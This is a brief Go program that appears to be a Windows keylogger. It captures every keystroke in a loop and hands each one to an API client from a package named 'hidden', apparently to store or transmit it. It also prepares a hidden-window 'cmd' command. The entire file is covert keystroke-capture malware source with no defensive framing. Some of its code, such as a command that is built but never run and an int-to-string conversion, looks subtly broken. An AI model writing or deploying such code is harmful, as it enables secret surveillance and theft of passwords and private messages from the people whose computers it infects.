package main

//import "os"
import (
	"os/exec"
	"time"
)
import "fmt"
import "syscall"
import "github.com/kindlyfire/go-keylogger"
import "github.com/kanadez/hidden/api"

const (
	key_fetch_delay_in_ms = 5
)

func main() {

	keylogger := keylogger.NewKeylogger()
	empty_counter := 0
	apiClient := api.NewApiClient()

	for {
		key := keylogger.GetKey()

		if !key.Empty {
			fmt.Printf("'%c' %d                     \n", key.Rune, key.Keycode)
			apiClient.StoreKey(key)
		}

		empty_counter++

		fmt.Printf("Empty count: %d\r", empty_counter)

		cmd := exec.Command("cmd", "/C", string(empty_counter))
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

		time.Sleep(key_fetch_delay_in_ms * time.Millisecond)
	}
}
